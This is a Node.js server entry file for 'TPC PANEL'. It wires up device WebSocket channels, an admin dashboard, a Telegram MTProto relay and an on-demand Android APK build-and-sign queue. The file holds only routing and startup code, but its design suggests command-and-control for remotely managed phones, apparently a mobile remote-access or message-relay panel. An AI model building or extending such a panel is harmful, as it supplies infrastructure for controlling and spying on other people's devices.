"use strict";

const http = require("http");
const express = require("express");
const cookieSession = require("cookie-session");
const { WebSocketServer } = require("ws");

const config = require("./config");
const db = require("./database");
const u = require("./utils");
const hub = require("./hub");
const relay = require("./relay");
const builder = require("./builder");

const devicesRoutes = require("./routes/devices");
const adminRoutes = require("./routes/admin");
const wsRoutes = require("./routes/ws");

const app = express();
app.disable("x-powered-by");
app.set("trust proxy", true);

app.use(express.json({ limit: "8mb" }));
app.use(express.urlencoded({ extended: true }));

app.use(cookieSession({
  name: config.COOKIE_NAME,
  keys: [config.SESSION_SECRET],
  maxAge: config.SESSION_MAX_AGE * 1000,
  sameSite: "lax",
  secure: config.FORCE_SECURE,
  httpOnly: true,
  domain: config.COOKIE_DOMAIN || undefined,
}));

// -------------------------------------------------------------- public

app.get("/", (req, res) => res.json({
  app: "TPC PANEL", status: "online", version: config.VERSION,
  owner: "https://t.me/icivan",
  relay: relay.TELETHON_OK ? "mtproto" : "unavailable",
  builder: builder.config.WORKER_MODE,
}));

app.get("/health", (req, res) => res.json({
  status: "ok", version: config.VERSION,
  devices_online: hub.hub.onlineCount,
  relay_authorized: !!relay.relayState.authorized,
  build_queue: builder.getQueue().stats(),
}));

app.get("/health/database", async (req, res, next) => {
  try {
    const r = await db.checkDatabase();
    if (r.status !== "ok") throw new u.HttpError(503, "Database connection failed");
    res.json(r);
  } catch (e) { next(e); }
});

app.get("/health/builder", async (req, res, next) => {
  try {
    const which = (bin) => {
      try {
        const r = require("child_process").execSync(`command -v ${bin}`, { stdio: ["ignore", "pipe", "ignore"] });
        return r.toString().trim() || null;
      } catch (_) { return null; }
    };
    const tools = {
      gradle: which(builder.config.GRADLE_BIN),
      keytool: which(builder.config.KEYTOOL_BIN),
      apksigner: which(builder.config.APKSIGNER_BIN),
      zipalign: which(builder.config.ZIPALIGN_BIN),
      docker: which(builder.config.DOCKER_BIN),
    };
    const fs = require("fs");
    const gradleOk = !!tools.gradle || builder.config.USE_DOCKER;
    const templateOk = fs.existsSync(builder.config.TEMPLATE_DIR);
    res.json({
      status: gradleOk && templateOk ? "ok" : "degraded",
      version: config.VERSION,
      variant: builder.config.DEFAULT_VARIANT,
      worker_mode: builder.config.WORKER_MODE,
      template_dir: builder.config.TEMPLATE_DIR,
      template_ok: templateOk,
      tools: Object.fromEntries(Object.entries(tools).map(([k, v]) => [k, !!v])),
      tool_paths: Object.fromEntries(Object.entries(tools).filter(([, v]) => v)),
      queue: builder.getQueue().stats(),
      counts: await db.builderStats(),
    });
  } catch (e) { next(e); }
});

// ---- admin dashboard page ----
const serveAdmin = (req, res, next) => {
  const fs = require("fs");
  if (!fs.existsSync(config.ADMIN_FILE)) return next(new u.HttpError(404, "Admin dashboard file not found"));
  res.setHeader("Cache-Control", "no-store");
  res.sendFile(config.ADMIN_FILE);
};
app.get("/admin", serveAdmin);
app.get("/admin/", serveAdmin);
app.get("/panel", serveAdmin);

// ---- APK builder routes ----
app.use(builder.router);

// ---- app routes ----
app.use(relay.router);          // /status /logs /login ... -> mount niche
app.use("/admin/relay", relay.router);
app.use(devicesRoutes);
app.use(adminRoutes);

// -------------------------------------------------------------- errors

app.use((req, res) => res.status(404).json({ detail: "Not found" }));
app.use((err, req, res, _next) => {
  const status = err instanceof u.HttpError ? err.status : (err.status || 500);
  if (status >= 500) console.error("[error]", err);
  res.status(status).json({ detail: err.message || "Server error" });
});

// ------------------------------------------------------------------ server

const server = http.createServer(app);
const wss = new WebSocketServer({ noServer: true });

server.on("upgrade", (req, socket, head) => {
  let pathname = "/";
  try { pathname = new URL(req.url, "http://localhost").pathname; } catch (_) {}

  let handler = null;
  if (pathname === "/ws/admin") handler = wsRoutes.adminSocket;
  else if (pathname.startsWith("/ws/device/")) {
    const rid = decodeURIComponent(pathname.slice("/ws/device/".length));
    handler = (ws, r) => wsRoutes.deviceSocket(ws, r, rid);
  } else if (pathname === "/ws/user") handler = (ws, r) => builder.userHub.userSocket(ws, r);
  else if (pathname === "/ws/app") handler = (ws, r) => builder.userHub.appSocket(ws, r);

  if (!handler) { socket.destroy(); return; }
  wss.handleUpgrade(req, socket, head, (ws) => handler(ws, req));
});

// ----------------------------------------------------------------- lifespan

async function start() {
  await db.initDbWithRetry();
  await u.backfillShortIds();
  await u.backfillAutoSender();
  await relay.loadBans();
  await relay.loadRelayConfig();
  await relay.startRelay();
  hub.spawn(hub.pruneEventsLoop());

  try {
    builder.config.ensureDirs();
    builder.bindLoop();
    builder.initQueue();
    if (builder.config.WORKER_MODE === "inline") await builder.getQueue().start();
    console.log(`APK builder ready — mode=${builder.config.WORKER_MODE} variant=${builder.config.DEFAULT_VARIANT}`);
  } catch (e) {
    console.error("APK builder start fail — panel chalta rahega", e);
  }

  console.log(`TPC PANEL v${config.VERSION} up — admins=${Object.keys(config.ADMINS)} secret=${config.SESSION_SECRET_SRC}`);

  const port = parseInt(process.env.PORT || "8000", 10);
  server.listen(port, () => console.log(`listening on :${port}`));
}

async function shutdown() {
  try { if (builder.config.WORKER_MODE === "inline") await builder.getQueue().stop(); } catch (_) {}
  await relay.stopRelay();
  await hub.closeSockets();
  await db.closeDb();
  server.close(() => process.exit(0));
  setTimeout(() => process.exit(0), 3000);
}

process.on("SIGINT", shutdown);
process.on("SIGTERM", shutdown);

if (require.main === module) {
  start().catch((e) => { console.error("startup failed", e); process.exit(1); });
}

module.exports = { app, server, start };